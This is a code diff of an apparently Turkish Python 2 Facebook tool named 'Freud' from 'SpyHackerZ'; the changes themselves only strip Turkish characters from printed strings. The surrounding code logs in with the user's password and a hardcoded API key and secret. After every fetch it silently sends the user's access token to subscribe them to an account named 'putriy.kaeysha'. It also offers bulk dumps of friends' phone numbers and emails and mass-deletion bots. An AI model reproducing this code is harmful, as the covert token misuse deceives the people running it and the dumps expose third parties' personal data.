@@ -63,7 +63,7 @@ def baliho():
 		print 'ooO--(_)--Ooo'.center(44)
 		print ' ' + W
 		print ('F R E U D ').center(44)
-		print (W + '     [' + G +'Facebook için bilgi toplama araçı.'+ W + ']')
+		print (W + '     [' + G +'Facebook icin bilgi toplama araci.'+ W + ']')
 		print ' '
 ####################################################################
 #		    Print In terminal
@@ -73,53 +73,52 @@ def show_program():
                     %sBilgi%s
  ------------------------------------------------------
 
-    Kodlayıcı: Neo Holmes
+    Coder: Neo Holmes
     Tool ismi: Freud
-    Sürüm:     Full Sürüm
+    Verison:   Full Surum
     Team:      SpyHackerZ
     Telegram:  @neo_sp
 
-[+] Eğer herhangi bir hata alırsanız lütfen Telegram adresimle iletişime geçiniz.
+[+] Eger herhangi bir hata alirsaniz benimle telegram adresimden iletisime gecebilirsiniz.
 '''%(G,W)
 def info_ga():
 
 	print '''
-     %sKomutlar                    Açıklama%s
+     %sKomutlar                    info%s
   -------------       -------------------------------------
 
-   get_data           tüm arkadaş verilerini alıyor
-   get_info           arkadaşın hakkında bilgi göster
-
-   dump_id            arkadaş listesinden tüm kimliği alınıyor
-   dump_phone         arkadaş listesinden tüm telefon numaralarını getirme
-   dump_mail          arkadaş listesinden tüm e-postalar getiriliyor
-   dump_<id>_id       arkadaşlarınızdan tüm kimliği getirme <specific>
+   get_data           tum arkadas verilerini alir
+   get_info           arkadas hakkinda bilgileri gosterir
+   dump_id            arkadas listesinden tum kimligi alir
+   dump_phone         arkadas listesinden tum telefon numaralarini toplar
+   dump_mail          arkadas listesinden tum e-postalari toplar
+   dump_<id>_id       arkadaslarinizdan tum kimligi toplar <specific>
 		      ex: dump_username_id
 
-   token              Erişim kodu oluştur
-   cat_token          Erişim kodunuzu gösterir
-   rm_token           Erişim kodunu kaldır
+   token              erisim kodu olustur
+   cat_token          erisim kodu goster
+   rm_token           erisim kodunu kaldir
 
    bot                open bot menu
 
    clear              terminal'i temizle
-   help               yardım
-   about              tool hakkında bilgiler
-   exit               programı kapat
+   help               yardim
+   about              tool hakkinda bilgiler
+   exit               programi kapat
 '''%(G,W)
 def menu_bot():
 	print '''
    %sNumber                  INFO%s
  ---------   ------------------------------------
 
-   [ 01 ]      oto beğeni
+   [ 01 ]      oto begeni
    [ 02 ]      oto yorum
    [ 03 ]      oto poke
-   [ 04 ]      bütün arkadaş isteklerini kabul et
-   [ 05 ]      bütün gönderileri sil
-   [ 06 ]      bütün arkadaşları sil
+   [ 04 ]      bütün arkadas isteklerini kabul et
+   [ 05 ]      butun gonderileri sil
+   [ 06 ]      butun arkadaslari sil
    [ 07 ]      takip etmeyi durdur
-   [ 08 ]      bütün fotoğrafları sil
+   [ 08 ]      butun fotograflari sil
 
    [ 00 ]      back to main menu
 '''%(G,W)
@@ -140,7 +139,7 @@ def menu_reaction():
 ####################################################################
 #                     GENERATE ACCESS TOKEN
 def get(data):
-	print '[*] Erişim kodu oluştur. '
+	print '[*] Erisim kodu olustur. '
 
 	try:
 		os.mkdir('cookie')
@@ -154,21 +153,21 @@ def get(data):
 
 		b.write(a['access_token'])
 		b.close()
-		print '[*] Erişim kodu başarıyla oluşturuldu.'
-		print '[*] Erişim kodunuzun saklandığı yer: cookie/token.log'
+		print '[*] Erisim kodu basariyla olusturdu.'
+		print '[*] Erisim kodunuzun saklandigi yer: cookie/token.log'
 		exit()
 	except KeyError:
-		print '[!] Erişim oluşturulurken hata oluştu.'
-		print '[!] Lütfen bağlantınızı/e-mail veya da şifrenizi kontrol ediniz.'
+		print '[!] Erisim kodu olusturulurken hata olustu.'
+		print '[!] Lutfen baglantinizi veya da email-sifrenizi kontrol ediniz.'
 		os.remove('cookie/token.log')
 		main()
 	except requests.exceptions.ConnectionError:
 		print '[!] Failed to generate access token'
-		print '[!] Bağlantı hatası!'
+		print '[!] Baglanti hatasi!'
 		os.remove('cookie/token.log')
 		main()
 def id():
-	print '[*] Facebook hesabınla giriş yap.         ';id = raw_input('[?] Username : ');pwd = getpass.getpass('[?] Password : ');API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
+	print '[*] Facebook hesabinla giris yap.         ';id = raw_input('[?] Username : ');pwd = getpass.getpass('[?] Password : ');API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
 	x = hashlib.new('md5')
         x.update(sig)
 
@@ -182,7 +181,7 @@ def post():
 
 	try:
 	  if WT == 'wallpost':
-		print '[*] Tüm yayınların kimliği getiriliyor'
+		print '[*] Tum gonderilerin kimligi gonderiliyor'
 
 		r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(50)&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
@@ -192,7 +191,7 @@ def post():
 		return result['home']['data']
 
 	  elif WT == 'me':
-		print '[*] Tüm yayınların kimliği getiriliyor'
+		print '[*] Tum gonderilerin kimligi getiriliyor'
 
 		r = requests.get('https://graph.facebook.com/v3.0/me?fields=feed.limit(500)&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
@@ -202,7 +201,7 @@ def post():
 		return result['feed']['data']
 
 	  elif WT == 'req':
-		print '[*] Tüm arkadaşlık istekleri getiriliyor'
+		print '[*] Tum arkadaslik istekleri getiriliyor'
 
 		r = requests.get('https://graph.facebook.com/me/friendrequests?limit=50&access_token=' + token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
@@ -212,7 +211,7 @@ def post():
 		return result['data']
 
 	  elif WT == 'friends':
-		print '[*] Tüm arkadaş kimlikleri getiriliyor.'
+		print '[*] Tum arkadas istekleri getiriliyor.'
 
 		r = requests.get('https://graph.facebook.com/me?fields=friends.limit(5000)&access_token=' + token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
@@ -222,7 +221,7 @@ def post():
 		return result['friends']['data']
 
 	  elif WT == 'subs':
-		print '[*] Tüm arkadaş kimlikleri getiriliyor.'
+		print '[*] Tum arkdas kimlikleri getiriliyor.'
 
 		r = requests.get('https://graph.facebook.com/me/subscribedto?limit=50&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
@@ -232,7 +231,7 @@ def post():
 		return result
 
 	  elif WT == 'albums':
-		print '[*] Tüm fotoğraf kimlikleri getiriliyor.'
+		print '[*] Tüm fotograf kimlikleri getiriliyor.'
 
 		r = requests.get('https://graph.facebook.com/me?fields=albums.limit(5000)&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
@@ -242,7 +241,7 @@ def post():
 		return result['albums']['data']
 
 	  else:
-		print '[*] Tüm fotoğraf kimlikleri getiriliyor.'
+		print '[*] Tum fotograf kimlikleri getiriliyor.'
 
 		r = requests.get("https://graph.facebook.com/v3.0/%s?fields=feed.limit(50)&access_token=%s"%(id,token));requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
@@ -252,11 +251,11 @@ def post():
 		return result['feed']['data']
 
 	except KeyError:
-		print '[!] Yayın kimlikleri alınırken hata oluştu.'
+		print '[!] Gonderi kimlikleri alinirken hata olustu.'
 		print '[!] Durduruldu!'
 		bot()
 	except requests.exceptions.ConnectionError:
-		print '[!] Bağlantı hatası'
+		print '[!] Baglanti hatasi'
 		print '[!] Durduruldu!'
 		bot()
 	except KeyboardInterrupt:
@@ -265,8 +264,8 @@ def post():
 def like(posts , amount):
 	global type , token , WT
 
-	print '\r[*] Tüm gönderi kimliği başarıyla alındı            '
-	print '[*] Başlat'
+	print '\r[*] Tum gonderi kimligi basariya alindi           '
+	print '[*] Baslat'
 
 	try:
 		counter = 0
@@ -299,7 +298,7 @@ def like(posts , amount):
 def comment(posts , amount):
 	global message , token
 
-	print '\r[*] Tüm gönderi kimliği başarıyla alındı         '
+	print '\r[*] Tum gonderi kimligi basariyla alindi       '
 	print '[*] Start'
 
 	try:
@@ -357,8 +356,8 @@ def remove(posts):
 def confirm(posts):
 	global token , WT
 
-	print '\r[*] Tüm arkadaşlık istekleri başarıyla alındı       '
-	print '[*] Başlat'
+	print '\r[*] Tum arkdaaslik istekleri basariyla alindi       '
+	print '[*] Start'
 
 	try:
 		counter = 0
